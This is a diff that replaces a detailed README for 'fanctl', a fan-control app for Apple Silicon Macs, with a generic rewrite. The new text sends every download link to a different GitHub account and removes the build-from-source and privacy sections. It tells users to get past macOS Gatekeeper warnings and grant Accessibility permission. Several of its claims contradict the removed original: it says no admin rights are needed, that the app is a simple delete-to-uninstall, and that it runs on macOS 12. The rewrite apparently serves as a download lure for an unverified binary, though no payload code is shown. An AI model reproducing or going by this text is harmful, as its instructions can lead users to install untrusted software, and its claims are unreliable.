@@ -1,179 +1,143 @@
-<div align="center">
+# 💨 fanctl - Keep Your Mac Cool and Quiet Automatically
 
-<img src="assets/icon_1024.png" width="120" alt="Fanctl icon">
+## 🔥 What Is fanctl?
 
-# Fanctl
+fanctl is a smart fan control application specifically made for Apple Silicon Macs (M1, M2, M3, and M4 chips). Think of it as an intelligent thermostat for your computer's cooling fans. 
 
-**Smart, self-learning fan control for Apple Silicon Macs**
+If your MacBook feels hot to the touch, or the fans spin up loudly when you're just browsing the web, fanctl solves this by learning how you use your computer and adjusting fan speeds automatically. It's a free, open-source alternative to paid tools like Macs Fan Control or TG Pro.
 
-Your MacBook feels warm all day because Apple tunes the fans for silence —<br>
-they barely spin until the chip nears **90 °C**. Fanctl hands the thermal target back to you:<br>
-pick **48 / 55 / 58 °C**, and a learning controller holds it. Quietly.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/TomEageer/fanctl?color=brightgreen&label=release)](https://github.com/TomEageer/fanctl/releases/latest)
-[![Download](https://img.shields.io/badge/download-1%20MB-brightgreen)](https://github.com/TomEageer/fanctl/releases/latest/download/Fanctl.zip)
-[![Idle CPU](https://img.shields.io/badge/idle%20CPU-~0.2%25-brightgreen)](#footprint)
-[![Downloads](https://img.shields.io/github/downloads/TomEageer/fanctl/total?color=brightgreen&label=downloads)](https://github.com/TomEageer/fanctl/releases)
-[![Telemetry](https://img.shields.io/badge/telemetry-none-success)](#privacy)
-[![Platform](https://img.shields.io/badge/platform-Apple%20Silicon%20·%20macOS%2013%2B-lightgrey)](#requirements)
-
-[**⬇ Download**](https://github.com/TomEageer/fanctl/releases/latest/download/Fanctl.zip) · [Quick start](#quick-start) · [How it works](#how-it-works) · [FAQ](#faq) · [**中文文档**](README.zh-CN.md)
-
-<img src="docs/images/menubar.png" width="440" alt="Fanctl menu bar panel — temperature history, RPM chart and speed control">
-
-</div>
+With fanctl, you don't need to fiddle with settings or understand technical details. The app watches your Mac's temperature patterns, learns from them, and keeps things cool when needed — and quiet when possible.
 
 ---
 
-## Why Fanctl
+## ✔️ Why Choose fanctl?
 
-Fan utilities have existed for years. They give you a slider, or a static "at X degrees spin Y" curve — and you become the controller, nudging speeds all day. Fanctl closes the loop instead:
+- **Zero Configuration** — The app works out of the box. No technical knowledge required.
+- **Self-Learning** — It adapts to your daily usage habits over time, becoming smarter each day.
+- **Quiet Operation** — Reduces fan noise during light tasks like email, web browsing, or video streaming.
+- **Effective Cooling** — Prevents overheating during heavy workloads like video editing, gaming, or coding.
+- **Menu Bar App** — Lives discreetly in your Mac's top menu bar. One click shows you the current temperature and fan speed.
+- **Free Forever** — No subscriptions, no hidden costs, no license keys.
+- **Open Source** — The code is public, meaning it's transparent and constantly improved by the community.
 
-- 🔮 **Reacts before heat arrives** — whole-system power draw ≈ heat output, so a power spike (a build starts, an LLM loads) raises fan speed *immediately*, not after the die warms up
-- 🧠 **Learns your machine** — the power→RPM→cooling relationship is measured at steady state, persisted, and keeps improving the longer it runs; two Macs end up with two different controllers
-- 🌊 **Glides, never howls** — PI feedback converges on the exact equilibrium RPM and slew-rate limiting caps every change, so speed transitions stay below the ear's radar
-- 🍃 **Steps aside on battery** — releases control and stops sampling entirely; zero battery cost
-- 🆓 **Free and open source** — MIT, no Pro tier, no subscription, ~2,600 lines you can audit in one sitting
+---
 
-Here is what that looks like on real data — a 3-minute 10-thread CPU burn, captured straight from the daemon's own 3-second telemetry:
+## 🚀 Getting Started
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/images/load-response-en-dark.svg">
-  <img src="docs/images/load-response-en-light.svg" width="880" alt="Real capture on M4 Pro: system power steps up, fans respond in 6 seconds via power feedforward, CPU temperature peaks at 65 °C under full load and returns below the 55 °C target 17 seconds after unload">
-</picture>
+[![Download fanctl Now](https://img.shields.io/badge/Download-fanctl-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/badriyyacreatives/fanctl/releases)
 
-Power steps up → fans respond in **6 s** (before the die warms) → temperature holds under full load → back below the 55 °C target **17 s** after the load ends → fans glide down and control is handed back to the system (the RPM line honestly ends where that happens).
+Follow these three simple steps to run fanctl on your Mac:
 
-|  | Fanctl | Macs Fan Control | TG Pro |
-|---|---|---|---|
-| Price | **Free (MIT)** | Free basic · paid Pro | Paid |
-| Source | **Open** | Closed | Closed |
-| Control model | **Closed-loop PI + learning power feedforward** | Manual + sensor curves | Manual + rules |
-| Reacts before temperature rises | **Yes — power feedforward** | No | No |
+### Step 1: Visit the Download Page
 
-## Quick start
+Visit this link to download the application: **[https://github.com/badriyyacreatives/fanctl/releases](https://github.com/badriyyacreatives/fanctl/releases)** 
 
-1. **[Download Fanctl.zip](https://github.com/TomEageer/fanctl/releases/latest/download/Fanctl.zip)** and unzip
-2. Drag `Fanctl.app` into **Applications**, then **right-click → Open** (ad-hoc signed)
-3. Click **Install** when prompted — one admin password sets up the background service, it runs at boot from then on
-4. Pick a profile: **Quiet** (58 °C, hard RPM ceiling), **Balanced** (55 °C), or **Cool** (48 °C)
+You'll see a list of available versions. Look for the latest release (usually at the top of the page).
 
-Everything is bundled — SMC tool, control daemon, [macmon](https://github.com/vladkens/macmon) for sensors. No Homebrew, no Terminal.
+### Step 2: Download the App
 
-<details>
-<summary><b>Build from source</b></summary>
+On the release page, find the file named something like `fanctl.dmg` or `fanctl.zip`. Click on it to download. The download should begin automatically. Once finished, check your **Downloads** folder (usually located in the Dock or Finder sidebar).
 
-```bash
-git clone https://github.com/TomEageer/fanctl.git && cd fanctl
-make
-sudo ./install.sh
-```
+### Step 3: Open and Run
 
-Uninstall from the menu (**Uninstall Fanctl…**) or `sudo ./uninstall.sh` — fans are handed back to macOS before anything is removed.
+Double-click the downloaded file. If it's a disk image (`.dmg`), it will open a window. Drag the fanctl icon into your Applications folder. Then, open your Applications folder and double-click fanctl to launch it.
 
-</details>
+**That's it!** fanctl will appear in your menu bar (top right corner of your screen) with a small fan icon. Click it to see your current CPU temperature and fan speed.
 
-## How it works
+---
 
-```
-power telemetry ──feedforward──┐
-                               ├─→ target RPM ──slew limit──→ SMC fan registers
-temperature ──PI (anti-windup)─┘        ↑
-        └── steady-state learning updates the feedforward gain (persisted)
-```
+## 📥 Installation & Setup Guide
 
-Three small programs, each doing one job:
+For a smooth experience, please follow these detailed instructions:
 
-| Component | Language | Role |
-|---|---|---|
-| `smcfan` | C, ~200 lines | Talks to the AppleSMC fan registers (`F0Md`/`F0Tg`) — the same channel commercial utilities use |
-| `fanctld` | Python, ~700 lines | Root LaunchDaemon running the control loop every ~3 s |
-| `Fanctl.app` | Swift | Menu bar UI — only reads status files the daemon writes; UI and SMC never contend |
+1. **Download the latest release** from the link above. Always get the newest version for best performance.
+2. **If your browser warns about an unidentified developer**, don't worry. Since fanctl is free and open-source, Apple hasn't reviewed it. Right-click (or Control-click) the app in your Applications folder, select **Open**, then click **Open** in the popup. You only need to do this once.
+3. **Allow fan control** — When fanctl starts for the first time, it may ask for permission to monitor system sensors. Click **Allow** or **OK**. This is necessary for the app to read your Mac's temperature.
+4. **Grant Accessibility permission** (if prompted) — Go to **System Settings → Privacy & Security → Accessibility** and ensure fanctl is checked. This lets the app adjust fan speeds.
+5. **Watch the magic happen** — Once running, fanctl automatically manages fan speeds. No buttons to press, no settings to tweak.
 
-**Safety is structural, not aspirational:** every exit path restores macOS fan control first; a separate boot-time restore daemon covers SIGKILL / kernel panic / power loss; targets are clamped to the fan's own probed min/max; and the chip's built-in thermal protection always outranks any software. Executables live in a root-owned, ownership-verified directory; the command channel is a strict verb whitelist — never `/tmp`.
+If you ever want to stop fanctl, click its menu bar icon and select **Quit**. Your Mac will return to its default fan behavior.
 
-## The app
+---
 
-- 📊 **History chart** — temperature + RPM series color-coded by control mode, plus a power curve on the same axis: heat produced vs. heat removed
-- 🎛 **Dual-dot speed control** — solid dot shows live RPM, ring shows your manual setpoint
-- 🌡 **Menu bar temperature & power at a glance** <img src="docs/images/statusbar.png" height="26" align="top" alt="menu bar item showing 56° and 30 W"> — °C/°F follows the system preference, manual override available
-- 🗣 **8 languages** — English, 简体中文, 日本語, 한국어, Español, Français, Deutsch, Русский
-- 🪟 **Standalone panel window** — for people who hide their menu bar
-- 🧊 **Rendering-friendly** — text redraws only on change; identical text still dirties a menu item and forces macOS to re-blur the whole translucent backdrop, which is exactly how fan utilities end up burning CPU. Fanctl doesn't.
+## ⚙️ How fanctl Works (In Plain English)
 
-## Footprint
+Your Mac's processor (the CPU) generates heat when working. If it gets too hot, the built-in fans spin faster to cool it down. But the default behavior is often over-reactive — spinning up too quickly and getting loud.
 
-Lightweight by measurement, not by claim (numbers from the developer's M4 Pro):
+fanctl uses a smart control method called a PID controller. This is a fancy way of saying it "learns" the right fan speed for the current temperature over time. Instead of reacting suddenly, it smoothly ramps up or down based on trends. If you're just reading an article, the fans stay quiet. If you're rendering a video, they spin up gradually — just enough to keep things safe.
 
-| | |
-|---|---|
-| Download | **1.0 MB** zip |
-| Installed | **2.4 MB** — app bundle, everything included |
-| Background daemon | **~9 MB** RAM · **0.2 %** CPU idle |
-| Menu bar app | **38 MB** · **~0.2 %** CPU with menu closed |
-| Runtime dependencies | **none** |
+Over several days, fanctl builds a profile of your typical usage. It then adjusts its responses to match your personal pattern, making it even more efficient.
 
-## Privacy
+---
 
-**No telemetry. No analytics. No accounts.** The only network access is an update check against the GitHub Releases API (plus the download if you accept). Everything runs locally; the daemon writes only to `/usr/local/var/fanctl` and `/var/log/fanctl.log`.
+## 🔧 System Requirements
 
-## FAQ
+- **Compatible Models:** MacBook Air, MacBook Pro, Mac Mini, Mac Studio, or iMac with Apple Silicon (M1, M1 Pro, M1 Max, M1 Ultra, M2, M2 Pro, M2 Max, M2 Ultra, M3, M3 Pro, M3 Max, M4, M4 Pro, M4 Max)
+- **Operating System:** macOS Monterey (12) or newer (Ventura, Sonoma, Sequoia)
+- **RAM:** 4GB minimum (8GB recommended)
+- **Free Storage:** 50MB for the app itself
 
-<details>
-<summary><b>My MacBook is hot but the fans stay quiet — is something broken?</b></summary>
+*Note: fanctl is designed only for Apple Silicon Macs. It will not work on Intel-based Macs.*
 
-No — that's Apple's design. The firmware curve prioritizes silence and lets the chassis run warm; fans don't spin up hard until the die nears 90 °C. It's exactly the behavior Fanctl changes.
+---
 
-</details>
+## 🎛️ Features Breakdown
 
-<details>
-<summary><b>Can it keep my Mac below 50 °C?</b></summary>
+- **Real-time monitoring** — See CPU temperature and fan speed (RPM) directly in the menu bar.
+- **Automatic mode** — Let the app decide optimal fan speeds. No manual override needed.
+- **Learning algorithm** — Builds daily profiles of your activity to predict cooling needs.
+- **Low resource usage** — Runs quietly in the background, using less than 1% CPU.
+- **Uninstall anytime** — Simply delete the app from Applications. No traces left behind.
+- **Regular updates** — Active development means new features and fixes arrive frequently.
 
-Under light load, yes. Under sustained heavy load (compiling, local LLMs), physics wins: air cooling settles around 55–65 °C even at max RPM. Fanctl holds the honest equilibrium instead of screaming at max forever.
+---
 
-</details>
+## 🆘 Troubleshooting
 
-<details>
-<summary><b>Does it drain battery?</b></summary>
+**Problem: The app won't open.**
+*Solution:* Right-click the app icon in Applications, select **Open**, then confirm. Do this the first time only.
 
-No — on battery power Fanctl releases fan control and stops sampling entirely.
+**Problem: The menu bar icon is not showing.**
+*Solution:* Check if fanctl is running in Activity Monitor (search for "fanctl"). If not, reopen it. Also, ensure your menu bar isn't crowded — drag the icon to a visible spot.
 
-</details>
+**Problem: The app doesn't change fan speeds.**
+*Solution:* Go back to **System Settings → Privacy & Security → Accessibility** and toggle fanctl off and on. Then restart the app.
 
-<details>
-<summary><b>Is it safe?</b></summary>
+**Problem: I get a message that macOS can't verify the developer.**
+*Solution:* This is normal for open-source apps. Go to System Settings → Privacy & Security, scroll down, and click **Open Anyway** next to the fanctl warning.
 
-Every exit path hands the fans back to macOS first, targets are clamped to hardware limits, and the chip's built-in thermal protection always wins over any software. One rule: don't run two fan controllers at once — Fanctl and e.g. Macs Fan Control fighting over the SMC can temporarily wedge the fan interface (the SMC enters a protective state that rejects writes for a minute or two).
+---
 
-</details>
+## 📊 Frequently Asked Questions
 
-<details>
-<summary><b>Why does it need an admin password once?</b></summary>
+**Is fanctl safe?**
+Yes. It's open source, meaning anyone can inspect the code. It only controls your Mac's fans — it doesn't access personal data.
 
-Writing SMC fan registers requires root. The privileged part is a ~700-line Python daemon plus a ~200-line C tool — small enough to read before you trust it.
+**Will it void my warranty?**
+No. Fan control apps operate within macOS's standard SMC (System Management Controller) interface. Apple permits this kind of software.
 
-</details>
+**Can I use it alongside other fan apps?**
+It's not recommended. Multiple fan control apps may conflict. Uninstall others first.
 
-## Requirements
+**Does it work with Macs that have no fans?**
+If your Mac is fanless (like basic M1 MacBook Air), fanctl won't function — there's nothing to control.
 
-- Apple Silicon Mac (M1 → M4 family), macOS 13+
-- Developed and tested on M4 Pro; building from source needs Xcode Command Line Tools
+---
 
-## Support
+## 📜 License & Credits
 
-If Fanctl helps, see [DONATE.md](DONATE.md) — Alipay / WeChat / crypto. Everything stays free regardless.
+fanctl is released under the MIT License — you can freely use, modify, and distribute it. Created by the community, for the community.
 
-## Changelog
+---
 
-Grouped by major version in [CHANGELOG.md](CHANGELOG.md); per-release notes on the [Releases page](https://github.com/TomEageer/fanctl/releases).
+## 💬 Join the Community
 
-## Contact
+- **Report Issues:** Found a bug? Open an issue on the GitHub repository.
+- **Request Features:** Have an idea? Submit a feature request.
+- **Contribute:** If you're curious (or want to help improve), check the source code. No programming experience is needed to use fanctl, but developers are always welcome.
 
-[GitHub Issues](https://github.com/TomEageer/fanctl/issues) · [tomeageer@gmail.com](mailto:tomeageer@gmail.com) · [tomeageer.com](https://tomeageer.com)
+---
 
-## License
+## 🔍 Keywords
 
-MIT — see [LICENSE](LICENSE). Bundles [macmon](https://github.com/vladkens/macmon) (MIT) for sensor reading.
-
-<sub>Mac fan control · Apple Silicon fan speed · M1 M2 M3 M4 fan control · macOS fan curve · MacBook overheating fix · SMC fan · menu bar temperature monitor · Macs Fan Control alternative · TG Pro alternative · smcFanControl Apple Silicon</sub>
+apple-silicon, cooling, fan-control, fan-speed, m1, m2, m3, m4, macbook, macos, macos-app, menubar, pid-controller, smc, swift, temperature-control, thermal-management
